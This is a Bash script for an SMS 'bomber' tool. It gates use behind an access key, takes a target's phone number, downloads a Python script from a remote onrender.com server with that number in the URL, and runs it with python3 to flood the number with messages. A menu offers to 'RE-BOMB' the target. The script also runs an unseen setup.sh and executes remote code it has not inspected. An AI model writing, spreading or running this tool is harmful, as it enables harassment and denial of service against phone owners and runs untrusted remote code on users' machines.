git clone "https://github.com/officialkeshav/information"
che=$(cat information/mis.txt)
rm -rf information 
if [ -f "setup.sh" ];
then
bash setup.sh
rm setup.sh
fi
clear
banner(){
echo -e '\e[95m
────────────█───────────────█
────────────██─────────────██
─────────────███████████████
────────────█████████████████
───────────███████████████████
──────────████──█████████──████
─────────███████████████████████
────────█████████████████████████
────────█████████████████████████
───███──▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒──███'
echo -e '\e[91m
──█████─█████████████████████████─█████
──█████─████████████████──███████─█████
──█████─██████────────█──█────███─█████
──█████─██    ▓▓█BOMBER─█▓▓─▓─███─█████
──█████─███─█─▓▓▓▓▓▓█──█▓▓─▓▓─███─█████
──█████─██──█─▓▓▓▓▓█──█▓▓─▓▓▓─███─█████
──█████─███─█─▓▓▓▓█──█▓▓─▓▓▓▓─███─█████
──█████─█████────█──█─────────███─█████
──█████─█████████──██████████████─█████
───███──████████──███████████████──███
────────█████████████████████████
─────────███████████████████████
──────────█████████████████████
─────────────██████───██████
─────────────██████───██████
─────────────██████───██████
─────────────██████───██████
──────────────████─────████

────────────────────────────────────────────────────────────────────────────────────────────
                                         INSTAGRAM:- official_.keshav'
                                         echo -e '\e[93m CODED BY KESHAV'

}
kes(){
echo -e '\e[95m               
                         __________
                      .~#########%%;~.
                     /############%%;`\
                    /######/~\/~\%%;,;,\
                   |#######\    /;;;;.,.|
                   |#########\/%;;;;;.,.|
          XX       |##/~~\####%;;;/~~\;,|       XX
        XX..X      |#|  o  \##%;/  o  |.|      X..XX
      XX.....X     |##\____/##%;\____/.,|     X.....XX
 XXXXX.....XX      \#########/\;;;;;;,, /      XX.....XXXXX
X |......XX%,.@      \######/%;\;;;;, /      @#%,XX......| X
X |.....X  @#%,.@     |######%%;;;;,.|     @#%,.@  X.....| X'
echo -e '\e[91mX  \...X     @#%,.@   ----------------    @ @ 00 0 xxxxxxxxx
 X# \.X        @#%,.@       BOMBER     @#%,.@        
                @#%,.@               @#%,.@          
                  @#%,.@           @#%,.@            
                     @#%,.@      @#%,.@             
                       @#%.,@  @#%,.@              
                        keshav Gupta
               INSTAGRAM:- official_.keshav'
                echo -e '\e[91m CODED BY KESHAV'
}
 
banner

 echo -e '\e[94m ENTER YOUR ACCESS KEY'
echo -e '\e[93m  IF YOU DONT KNOW ACCESS KEY THEN MESSAGE TELEGRAM :- OFFICIALKESHAV'
read acces
if [ "$che" == "$acces" ];
then
echo""
else
echo "wrong key restar tool"

sleep 1.0
bash pass.sh

fi
sleep 3.0
clear
kes
echo  -ne "\e[91m Enter Your number :-"
sleep 5.0

bomb(){
clear 
banner 
echo -e "\e[95m Settting Up Server"
curl -o keshav.py "https://mbomber2-o.onrender.com/jatinkalwar/sms/$num"  >/dev/null 2>&1
if [ -f "keshav.py" ];
then
action=$(cat keshav.py)
if [ "$action" == "false" ];then
echo "Something Went Wrong From Server"
else
echo -e "\e[95m Bombing start"
python3 keshav.py
fi
else
echo "Something Went Wrong"
fi
con
}
con(){
echo -e " "
echo -e "\e[31m# \e[93m BOMBER\e[93m \e[92m(\e[31m$v\e[92m)"
echo -e "\e[92m[\e[91m1\e[92m]\e[93m RE-BOMB\e[93m"
echo -e "\e[92m[\e[91m2\e[92m]\e[93m EXIT\e[93m"
echo -e "\e[92m[\e[91m3\e[92m]\e[93m ARE BHAI BAS KAR PHONE MAAR JAYEGA USKA\e[93m"
echo -ne "select:-"

read opt
if [ $opt -eq 1 ];then  
bomb
   con
    elif [ $opt -eq 2 ]; then
    clear
elif [ $opt -eq 3 ]; then
echo  -ne "\e[91m wrong input"
else 
echo  ""
fi

}
read num
bomb
